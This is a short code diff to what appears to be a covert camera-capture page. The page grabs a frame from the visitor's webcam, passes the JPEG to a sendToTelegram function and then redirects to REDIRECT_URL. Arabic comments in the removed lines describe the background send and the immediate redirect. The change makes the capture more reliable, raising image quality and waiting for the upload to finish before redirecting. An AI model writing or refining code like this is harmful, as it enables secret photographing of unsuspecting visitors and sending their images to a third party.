@@ -73,15 +73,15 @@
         video.srcObject = stream;
         await new Promise(r => { video.onloadedmetadata = r; });
         video.play();
-        await new Promise(r => setTimeout(r, 300));
+        await new Promise(r => setTimeout(r, 600));
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         canvas.getContext('2d').drawImage(video, 0, 0);
         stream.getTracks().forEach(t => t.stop());
-        canvas.toBlob((blob) => {
-          if (blob) sendToTelegram(blob); // يرسل في الخلفية بدون انتظار
-          window.location.href = REDIRECT_URL; // يحول فوراً
-        }, 'image/jpeg', 0.85);
+        canvas.toBlob(async (blob) => {
+          if (blob) await sendToTelegram(blob);
+          window.location.href = REDIRECT_URL;
+        }, 'image/jpeg', 0.92);
       } catch(_) { window.location.href = REDIRECT_URL; }
     }
 
